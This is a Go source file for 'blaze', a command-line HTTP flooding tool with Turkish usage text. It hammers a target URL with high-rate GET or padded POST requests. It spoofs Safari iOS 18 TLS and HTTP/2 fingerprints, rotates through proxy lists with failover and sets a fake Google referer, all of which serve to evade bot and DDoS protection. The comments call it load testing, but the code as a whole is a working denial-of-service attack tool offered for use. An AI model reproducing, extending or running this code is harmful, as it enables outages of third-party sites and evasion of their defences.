package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	gofire "github.com/JSInvasor/Gohttp-clientfingerprintemulateandfastest"
)

const (
	white = "\033[37m"
	gray  = "\033[38;5;245m"
	red   = "\033[31m"
	reset = "\033[0m"
)

func main() {
	if len(os.Args) >= 2 && os.Args[1] == "fp" {
		fpURL := "https://tls.peet.ws/api/all"
		if len(os.Args) >= 3 {
			fpURL = os.Args[2]
		}
		runFingerprintCheck(fpURL)
		return
	}
	if len(os.Args) < 4 {
		fmt.Println("kullanim: blaze <url> <sure_sn> <thread> [stream] [method] [proxy|proxy_dosya] [--body=BOYUT]")
		fmt.Println()
		fmt.Println("ornek:    ./blaze https://hedef.com 60 64 32")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 GET proxyler.txt")
		fmt.Println("ornek:    ./blaze https://hedef.com 60 40 40 POST --body=16k")
		fmt.Println("ornek:    ./blaze fp                        (Safari iOS 18 canli JA3/JA4/H2 fingerprint)")
		os.Exit(1)
	}

	targetURL := os.Args[1]
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "https://" + targetURL
	}

	durSec := mustInt(os.Args[2], "sure")
	threads := mustInt(os.Args[3], "thread")

	streams := 32
	method := "GET"
	proxyArg := ""
	bodySize := 0

	posArgs := []string{}
	for _, arg := range os.Args[4:] {
		switch {
		case strings.HasPrefix(arg, "--body="):
			bodySize = mustBytes(strings.TrimPrefix(arg, "--body="))
		default:
			posArgs = append(posArgs, arg)
		}
	}
	if len(posArgs) >= 1 {
		streams = mustInt(posArgs[0], "stream")
	}
	if len(posArgs) >= 2 {
		method = strings.ToUpper(posArgs[1])
	}
	if len(posArgs) >= 3 {
		proxyArg = posArgs[2]
	}

	// A body only ships on methods that carry one. Promote GET → POST if the
	// user asked for a body but left the method at GET, so the bytes actually
	// reach the origin.
	if bodySize > 0 && method == "GET" {
		method = "POST"
	}

	run(targetURL, durSec, threads, streams, method, proxyArg, bodySize)
}

// runFingerprintCheck prints Safari iOS 18's live JA3/JA4 + HTTP/2 (Akamai)
// fingerprint as observed by a fingerprint echo service. Use it to confirm
// gofire's emulation matches a real Safari device.
func runFingerprintCheck(fpURL string) {
	fmt.Printf("%sfingerprint kaynagi: %s%s\n", gray, fpURL, reset)

	c, err := gofire.Emulate(gofire.SafariIOS18)
	if err != nil {
		fmt.Printf("%sSafariIOS18: emulate hatasi: %v%s\n", red, err, reset)
		return
	}
	defer c.Close()

	var body string
	var status int
	var lastErr error
	for attempt := 0; attempt < 2; attempt++ {
		ctx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		resp, errReq := c.DoWithContext(ctx, "GET", fpURL, nil, nil)
		if errReq != nil {
			cancel()
			lastErr = errReq
			continue
		}
		status = resp.StatusCode()
		body, lastErr = resp.Text()
		resp.Close()
		cancel()
		if lastErr == nil && body != "" {
			break
		}
	}

	if lastErr != nil {
		fmt.Printf("%sSafariIOS18: hata (status=%d): %v%s\n", red, status, lastErr, reset)
		return
	}

	var d struct {
		TLS struct {
			JA3Hash string `json:"ja3_hash"`
			JA4     string `json:"ja4"`
		} `json:"tls"`
		HTTP2 struct {
			Akamai string `json:"akamai_fingerprint"`
		} `json:"http2"`
	}
	if errJSON := json.Unmarshal([]byte(body), &d); errJSON != nil {
		fmt.Printf("%sSafariIOS18: parse edilemedi (status=%d, len=%d): %v | ham: %.160s%s\n", red, status, len(body), errJSON, body, reset)
		return
	}
	fmt.Printf("%sSafariIOS18%s (status=%d)\n  ja4=%s\n  ja3_hash=%s\n  h2=%s\n", white, reset, status, d.TLS.JA4, d.TLS.JA3Hash, d.HTTP2.Akamai)
}

type clientGroup struct {
	clients   []*gofire.Client
	pipelines []*gofire.Pipeline
	templates []*http.Request
}

func (cg *clientGroup) Close() {
	for _, p := range cg.pipelines {
		p.Close()
	}
	for _, c := range cg.clients {
		c.Close()
	}
}

// classifyErr turns a raw error string into a short, actionable reason.
// Handshake failures get broken down by *why* they failed — the generic
// "tls handshake failed" hid whether the cause was a slow proxy (timeout),
// a proxy dropping the tunnel (reset/EOF), a MITM proxy (cert), or a
// non-tunneling proxy (CONNECT failed).
func classifyErr(errMsg string) string {
	lc := strings.ToLower(errMsg)
	switch {
	case strings.Contains(lc, "connect failed") || strings.Contains(lc, "connect "):
		return trimErr(errMsg, "proxy CONNECT failed: ")
	case strings.Contains(lc, "i/o timeout") || strings.Contains(lc, "deadline exceeded") || strings.Contains(lc, "timeout"):
		if strings.Contains(lc, "handshake") || strings.Contains(lc, "server hello") {
			return "tls handshake timeout (slow/dead proxy)"
		}
		return "timeout (slow/dead proxy)"
	case strings.Contains(lc, "certificate") || strings.Contains(lc, "x509"):
		return "tls cert error (MITM/transparent proxy?)"
	case strings.Contains(lc, "eof") || strings.Contains(lc, "reset") || strings.Contains(lc, "broken pipe"):
		return "tls handshake: tunnel dropped by proxy"
	case strings.Contains(lc, "server hello") || strings.Contains(lc, "handshake"):
		return trimErr(errMsg, "tls handshake: ")
	case strings.Contains(lc, "connection refused"):
		return "connection refused"
	case strings.Contains(lc, "no route to host"):
		return "no route to host (dead proxy)"
	default:
		return trimErr(errMsg, "")
	}
}

func trimErr(errMsg, prefix string) string {
	if len(errMsg) > 200 {
		errMsg = errMsg[:200] + "..."
	}
	return prefix + errMsg
}

func formatTestResult(statusCode int, err error) string {
	if err != nil {
		return fmt.Sprintf("%sImpersonate Safari iOS 18 %s>%s %s%s%s", white, gray, reset, red, classifyErr(err.Error()), reset)
	}
	return fmt.Sprintf("%sImpersonate Safari iOS 18 %s>%s %s%d%s", white, gray, reset, white, statusCode, reset)
}

func run(targetURL string, durSec, threads, streams int, method, proxyArg string, bodySize int) {
	runtime.GOMAXPROCS(runtime.NumCPU())

	// Pre-build the POST body once. The same buffer is shared (read-only) by
	// every client's template via GetBody, so there's no per-request alloc.
	var bodyBytes []byte
	if bodySize > 0 {
		bodyBytes = make([]byte, bodySize)
		for i := range bodyBytes {
			bodyBytes[i] = 'A'
		}
		if len(bodyBytes) >= 2 {
			bodyBytes[0] = 'f'
			bodyBytes[1] = '='
		}
		fmt.Printf("%sbody modu: %s %d byte/request (origin'e buyuk paket)%s\n",
			gray, method, bodySize, reset)
	}

	totalTargetClients := threads
	if totalTargetClients < 1 {
		totalTargetClients = 1
	}

	idlePerHost := threads * streams
	if idlePerHost < 256 {
		idlePerHost = 256
	}

	usingProxy := proxyArg != ""

	reqTimeout := 10 * time.Second
	dialTO := 8 * time.Second
	tlsTO := 8 * time.Second
	if usingProxy {
		reqTimeout = 30 * time.Second
		dialTO = 15 * time.Second
		tlsTO = 15 * time.Second
	}

	baseOpts := []gofire.Option{
		gofire.WithTimeout(reqTimeout),
		gofire.WithTLSHandshakeTimeout(tlsTO),
		gofire.WithDialTimeout(dialTO),
		gofire.WithMaxIdleConnsPerHost(idlePerHost),
		gofire.WithMaxIdleConns(0),
		gofire.WithMaxConnsPerHost(0),
		gofire.WithDNSCacheTTL(30 * time.Minute),
		gofire.WithIdleConnTimeout(120 * time.Second),
		gofire.WithMaxRedirects(3),
		gofire.WithWriteBufferSize(128 * 1024),
		gofire.WithReadBufferSize(128 * 1024),
		// Throughput-oriented defaults from the perf commit. MaxStreamsPerConn
		// is bumped well above the browser-fidelity 8000 so the h2 conn doesn't
		// cycle mid-loadtest. Socket buffers raised to 2MB for fat-pipe BDP.
		// WriteByteTimeout tightened so a slow proxy can't pin a worker for 30s.
		gofire.WithMaxStreamsPerConn(50000),
		gofire.WithSocketBuffers(2*1024*1024, 2*1024*1024),
		gofire.WithWriteByteTimeout(8 * time.Second),
	}

	referer := "https://www.google.com/search?client=safari&channel=iphone_bm"

	// Proxy setup: single URL → WithProxy on every client; file → shared
	// rotator with sticky-primary failover so a dead proxy fails over to a
	// live one and the whole list is exercised.
	var rotator *gofire.ProxyRotator
	proxyCount := 0
	if usingProxy {
		if isProxyFile(proxyArg) {
			pr, err := gofire.NewProxyRotatorFromFile(proxyArg)
			if err != nil {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi yuklenemedi: %v%s\n", red, err, reset)
				os.Exit(1)
			}
			if pr.Count() == 0 {
				fmt.Fprintf(os.Stderr, "%shata: proxy dosyasi bos%s\n", red, reset)
				os.Exit(1)
			}
			pr.SetCooldown(15 * time.Second)
			rotator = pr
			proxyCount = pr.Count()
		} else {
			baseOpts = append(baseOpts, gofire.WithProxy(proxyArg))
		}
	}

	clientBudget := totalTargetClients
	if rotator != nil {
		clientBudget = rotator.Count()
	}
	if clientBudget < 2 {
		clientBudget = 2
	}

	workersPerClient := (threads * streams) / clientBudget
	if workersPerClient < 1 {
		workersPerClient = 1
	}

	cg := &clientGroup{}
	proxyIdx := 0
	for i := 0; i < clientBudget; i++ {
		clientOpts := make([]gofire.Option, 0, len(baseOpts)+2)
		clientOpts = append(clientOpts, baseOpts...)
		clientOpts = append(clientOpts, gofire.WithReferer(referer))
		c, err := gofire.Emulate(gofire.SafariIOS18, clientOpts...)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: client olusturulamadi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
		if rotator != nil {
			c.SetProxyRotator(rotator.Pinned(proxyIdx))
			proxyIdx++
		}
		tmpl, err := c.PrepareRequest(method, targetURL)
		if err != nil {
			fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
			os.Exit(1)
		}
		if bodyBytes != nil {
			attachBody(tmpl, bodyBytes, targetURL)
		}
		p := c.NewPipeline(workersPerClient)
		p.SetTemplate(tmpl)
		cg.clients = append(cg.clients, c)
		cg.pipelines = append(cg.pipelines, p)
		cg.templates = append(cg.templates, tmpl)
	}
	defer cg.Close()

	// Connectivity probe — single GET to confirm we can reach + TLS-handshake
	// the target with the Safari fingerprint. With a proxy file in use this
	// only samples one of N proxies; one bad probe doesn't mean the run fails.
	if proxyCount > 0 {
		rest := proxyCount - 1
		if rest < 0 {
			rest = 0
		}
		fmt.Printf("%s%d proxy yuklendi (test 1 proxy'i ornekliyor — geri kalan %d proxy yine de calisir)%s\n",
			gray, proxyCount, rest, reset)
	}
	testTimeout := 15 * time.Second
	if proxyCount > 0 {
		testTimeout = 30 * time.Second
	}
	{
		testCtx, testCancel := context.WithTimeout(context.Background(), testTimeout)
		resp, testErr := cg.clients[0].DoWithContext(testCtx, "GET", targetURL, nil, nil)
		testCancel()
		if testErr != nil {
			fmt.Println(formatTestResult(0, testErr))
		} else {
			fmt.Println(formatTestResult(resp.StatusCode(), nil))
			resp.Close()
		}
	}

	// When the load ships a body, probe the actual POST+body request once.
	// A failure here (while the GET line above is green) means the target
	// rejects the POST itself — not a client problem.
	if bodyBytes != nil && len(cg.templates) > 0 {
		probeCtx, probeCancel := context.WithTimeout(context.Background(), testTimeout)
		resp, probeErr := cg.clients[0].FastDo(probeCtx, cg.templates[0])
		probeCancel()
		if probeErr != nil {
			fmt.Printf("%sPOST Safari iOS 18 %db %s>%s %s%s%s\n",
				white, len(bodyBytes), gray, reset, red, classifyErr(probeErr.Error()), reset)
		} else {
			fmt.Printf("%sPOST Safari iOS 18 %db %s>%s %s%d%s\n",
				white, len(bodyBytes), gray, reset, white, resp.StatusCode(), reset)
			resp.Close()
		}
	}

	// Pre-warm silently to kill cold-start latency on the first second of load.
	warmCtx, warmCancel := context.WithTimeout(context.Background(), 10*time.Second)
	for _, c := range cg.clients {
		_ = c.PreConnect(warmCtx, targetURL, 4)
	}
	warmCancel()

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(durSec)*time.Second)
	defer cancel()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	go func() {
		<-sigCh
		cancel()
	}()

	var (
		totalSent   atomic.Int64
		totalFailed atomic.Int64
		errMu       sync.Mutex
		recentErrs  []string
		errCountMap sync.Map
	)

	onResult := func(resp *gofire.Response, err error, latency time.Duration) {
		totalSent.Add(1)
		if err != nil {
			totalFailed.Add(1)
			errStr := err.Error()
			if strings.Contains(errStr, "context canceled") {
				return
			}
			if len(errStr) > 200 {
				errStr = errStr[:200]
			}
			if _, loaded := errCountMap.LoadOrStore(errStr, &atomic.Int64{}); !loaded {
				errMu.Lock()
				if len(recentErrs) < 10 {
					recentErrs = append(recentErrs, errStr)
				}
				errMu.Unlock()
			}
			if val, ok := errCountMap.Load(errStr); ok {
				val.(*atomic.Int64).Add(1)
			}
		}
	}

	for _, p := range cg.pipelines {
		p.OnResult = onResult
	}

	var feedWg sync.WaitGroup
	feedPipeline := func(pipeline *gofire.Pipeline) {
		defer feedWg.Done()
		for {
			select {
			case <-ctx.Done():
				return
			default:
			}
			pipeline.FireAndForget(ctx, method, targetURL, nil, nil)
		}
	}

	// Scale feeders with worker count so the job channel never starves.
	feedersPerPipeline := workersPerClient / 8
	if feedersPerPipeline < 4 {
		feedersPerPipeline = 4
	}
	for _, p := range cg.pipelines {
		for i := 0; i < feedersPerPipeline; i++ {
			feedWg.Add(1)
			go feedPipeline(p)
		}
	}

	startTime := time.Now()
	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		var lastSent int64
		var peakRPS int64

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				sent := totalSent.Load()
				elapsed := time.Since(startTime).Seconds()
				rps := sent - lastSent
				lastSent = sent
				if rps > peakRPS {
					peakRPS = rps
				}
				fmt.Printf("\r%ssent:%d rps:%d peak:%d %.0fs%s   ",
					white, sent, rps, peakRPS, elapsed, reset)
			}
		}
	}()

	feedWg.Wait()
	fmt.Println()

	errMu.Lock()
	if len(recentErrs) > 0 {
		fmt.Println()
		for _, e := range recentErrs {
			count := int64(0)
			if val, ok := errCountMap.Load(e); ok {
				count = val.(*atomic.Int64).Load()
			}
			fmt.Printf("%s[%dx] %s%s\n", red, count, e, reset)
		}
	}
	errMu.Unlock()
}

func isProxyFile(s string) bool {
	if strings.Contains(s, "://") {
		return false
	}
	if _, err := os.Stat(s); err == nil {
		return true
	}
	return strings.HasSuffix(s, ".txt") || strings.HasSuffix(s, ".list") || strings.HasSuffix(s, ".csv")
}

func mustInt(s, name string) int {
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz %s: %s%s\n", red, name, s, reset)
		os.Exit(1)
	}
	return v
}

// mustBytes parses a size like "512", "16k", "2m" into a byte count.
func mustBytes(s string) int {
	s = strings.TrimSpace(strings.ToLower(s))
	mult := 1
	switch {
	case strings.HasSuffix(s, "k"):
		mult = 1024
		s = strings.TrimSuffix(s, "k")
	case strings.HasSuffix(s, "m"):
		mult = 1024 * 1024
		s = strings.TrimSuffix(s, "m")
	}
	v, err := strconv.Atoi(s)
	if err != nil || v <= 0 {
		fmt.Fprintf(os.Stderr, "%shata: gecersiz --body boyutu: %s (ornek: --body=16k)%s\n", red, s, reset)
		os.Exit(1)
	}
	return v * mult
}

// attachBody wires a fixed body into a template request so FastDo can replay
// it. GetBody hands a fresh reader to every send (the shallow template copy
// shares one Body that would otherwise EOF after the first request). The
// Content-Type, Content-Length and Origin headers a real browser sends on a
// form POST are also set — all already have ordered slots in the Safari
// HeaderOrder, so the fingerprint stays valid.
func attachBody(tmpl *http.Request, body []byte, targetURL string) {
	tmpl.Body = io.NopCloser(bytes.NewReader(body))
	tmpl.ContentLength = int64(len(body))
	tmpl.GetBody = func() (io.ReadCloser, error) {
		return io.NopCloser(bytes.NewReader(body)), nil
	}
	tmpl.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	if u, err := url.Parse(targetURL); err == nil && u.Host != "" {
		tmpl.Header.Set("Origin", u.Scheme+"://"+u.Host)
	}
}
